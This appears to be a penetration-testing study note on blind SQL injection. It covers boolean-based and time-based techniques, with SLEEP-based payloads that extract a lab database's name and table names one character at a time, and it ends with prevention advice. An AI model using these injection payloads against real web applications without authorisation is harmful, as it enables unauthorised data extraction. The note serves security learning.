---

tags:

- #pentesting
- #sql-injection
- #blind-sqli
- #web-app-security
- #mysql created: 2026-02-03 topic: Web Application Penetration Testing category: SQL Injection → Blind Injection

---

# 🔐 Blind SQL Injection

---

> [!abstract] What is Blind SQL Injection? Blind SQL Injection is a type of SQL Injection attack where the attacker **cannot directly see** the results of the database query or error messages. Instead, the attacker asks the database **true or false questions** through crafted SQL queries and infers data based on the application's response or behaviour.

---

## 📌 Types

There are **two main types** of Blind SQL Injection:

> [!tip] Boolean-Based Blind SQL Injection
> 
> - The attacker injects SQL queries **conditional on true or false** expressions.
> - Differences in the application's response content or behaviour reveal information.
> 
> **Example:**
> 
> ```
> http://example.com/item?id=34 AND 1=1   ← true  → normal response
> http://example.com/item?id=34 AND 1=2   ← false → empty / different response
> ```

> [!warning] Time-Based Blind SQL Injection
> 
> - The attacker uses SQL functions to **delay** the database response if a condition is true.
> - By measuring response times, the attacker determines the truth value.
> 
> **Common delay functions by database type:**
> 
> |Database|Delay Function|
> |:--|:--|
> |MySQL|`SLEEP(5)`|
> |PostgreSQL|`pg_sleep(5)`|
> |SQL Server|`WAITFOR DELAY '0:0:5'`|
> 
> **Example payload:**
> 
> ```sql
> IF(condition, SLEEP(5), SLEEP(0))
> ```

---

## ⚙️ How It Works

Since the attacker cannot view direct query results or error messages, they rely on **indirect clues** such as:

- 📄 Changes in web page content
- 📶 Differences in HTTP responses
- ⏱️ Time delays in responses

> [!note] The attacker sends **multiple queries** that iteratively infer the value of data — such as characters in a password — through a series of **true/false** or **time-based** tests.

---

## 🎯 Exploitation Steps

> [!steps] Attack Flow
> 
> 1. **Identify** a vulnerable input parameter.
> 2. **Send boolean-based payloads** to see if the response changes based on logic.
> 3. **Use time delays** if responses are uniform but the database still processes the query.
> 4. **Extract data** one character or bit at a time using crafted SQL queries.

---

## 💻 SQL Commands — Boolean Type

### Connect & Select Database

```sql
-- Connect to MySQL
mysql -u root -pbug

-- Select the target database
USE sqli_db;

-- List all databases
SHOW DATABASES;
```

---

### 📦 Database Metadata Extraction

```sql
-- Get current database name
SELECT DATABASE();

-- Get length of current database name
SELECT LENGTH(DATABASE());
```

#### Length Boolean Checks

```sql
SELECT LENGTH(DATABASE()) = 8;   -- exact match?
SELECT LENGTH(DATABASE()) > 8;   -- greater than?
SELECT LENGTH(DATABASE()) < 8;   -- less than?
```

---

### 🔤 Character-by-Character Extraction (SUBSTR)

> [!info] How SUBSTR works here `SUBSTR(DATABASE(), position, length)` — extracts **one character at a time** from the database name, letting you reconstruct it letter by letter.

```sql
SELECT SUBSTR(DATABASE(), 1, 1);   -- 1st char
SELECT SUBSTR(DATABASE(), 2, 1);   -- 2nd char
SELECT SUBSTR(DATABASE(), 3, 1);   -- 3rd char
SELECT SUBSTR(DATABASE(), 4, 1);   -- 4th char
SELECT SUBSTR(DATABASE(), 5, 1);   -- 5th char
SELECT SUBSTR(DATABASE(), 6, 1);   -- 6th char
SELECT SUBSTR(DATABASE(), 7, 1);   -- 7th char
```

#### ASCII Value Extraction

```sql
-- Convert characters to ASCII for comparison
SELECT ASCII(SUBSTR(DATABASE(), 1, 1));
SELECT ASCII(SUBSTR(DATABASE(), 2, 1));
```

#### Boolean Conditions on ASCII Values

```sql
SELECT ASCII(SUBSTR(DATABASE(), 1, 1)) = 97;   -- exact match
SELECT ASCII(SUBSTR(DATABASE(), 1, 1)) < 97;   -- less than
SELECT ASCII(SUBSTR(DATABASE(), 1, 1)) > 80;   -- greater than
```

---

---

## ⏱️ SQL Commands — Time-Based Type

### Select Database & Confirm Injection

```sql
USE sqli_db;

-- Confirm injection is possible (10-second delay)
SELECT SLEEP(10);
```

---

### 🔍 Version Detection

```sql
-- Get database version
SELECT VERSION();

-- Time-based check: does version start with "5"?
SELECT IF((SELECT VERSION()) LIKE "5%", SLEEP(10), NULL);

-- Time-based check: does version start with "8"?
SELECT IF((SELECT VERSION()) LIKE "8%", SLEEP(10), NULL);

-- Heavy delay variant (100s)
SELECT IF((SELECT VERSION()) LIKE "8%", SLEEP(100), NULL);
```

---

### 📏 Database Name — Length Probing

```sql
SELECT IF((SELECT LENGTH(DATABASE())) = 6, SLEEP(10), NULL);
SELECT IF((SELECT LENGTH(DATABASE())) = 7, SLEEP(10), NULL);
SELECT IF((SELECT LENGTH(DATABASE())) = 9, SLEEP(10), NULL);
```

---

### 🔤 Database Name — Character Extraction

> [!tip] Pattern If the query **delays by 10 seconds**, the character guess is **correct**. If it returns instantly, it is **wrong**.

```sql
SELECT IF(SUBSTR(DATABASE(), 1, 1) = 's', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 2, 1) = 'q', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 3, 1) = 'l', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 4, 1) = 'i', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 5, 1) = '_', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 6, 1) = 'd', SLEEP(10), NULL);
SELECT IF(SUBSTR(DATABASE(), 7, 1) = 'b', SLEEP(10), NULL);
```

> [!success] Result Reconstructed database name: **`sqli_db`**

---

### ✅ Full Name Equality Confirm

```sql
SELECT IF((SELECT DATABASE()) = "sqli_db",  SLEEP(10), NULL);   -- delays → CORRECT
SELECT IF((SELECT DATABASE()) = "sqli_db1", SLEEP(10), NULL);   -- instant → WRONG
```

---

---

## 🗃️ Table Name Extraction

> [!note] Source Table names are pulled from `information_schema.tables` using `LIMIT offset,1` to iterate through them one by one.

### Character-by-Character (First Table)

```sql
-- Table 0, extracting character by character
SELECT IF((SELECT SUBSTR(table_name, 1, 1) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1) = 'c', SLEEP(10), NULL);
SELECT IF((SELECT SUBSTR(table_name, 2, 1) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1) = 'i', SLEEP(10), NULL);
SELECT IF((SELECT SUBSTR(table_name, 3, 1) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1) = 't', SLEEP(10), NULL);
SELECT IF((SELECT SUBSTR(table_name, 4, 1) FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1) = 'y', SLEEP(10), NULL);
```

### Full Table Name Confirmation

```sql
-- Confirm table 0
SELECT IF((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1) = 'city',    SLEEP(10), NULL);

-- Confirm remaining tables
SELECT IF((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1,1) = 'course',  SLEEP(10), NULL);
SELECT IF((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 2,1) = 'student', SLEEP(10), NULL);
SELECT IF((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 3,1) = 'users',   SLEEP(10), NULL);
```

> [!success] Discovered Tables
> 
> |#|Table Name|
> |:--|:--|
> |0|`city`|
> |1|`course`|
> |2|`student`|
> |3|`users`|

---

---

## 🛡️ Prevention

> [!danger] How to Defend Against Blind SQLi
> 
> - Use **parameterised queries** or prepared statements.
> - Employ robust **input validation and sanitisation**.
> - **Disable** detailed error messages to users.
> - Use **Web Application Firewalls (WAF)** and run regular vulnerability scans.
> - Apply **least privilege** principles on all database access accounts.

---

_Web Application Penetration Testing → SQL Injection → Blind Injection_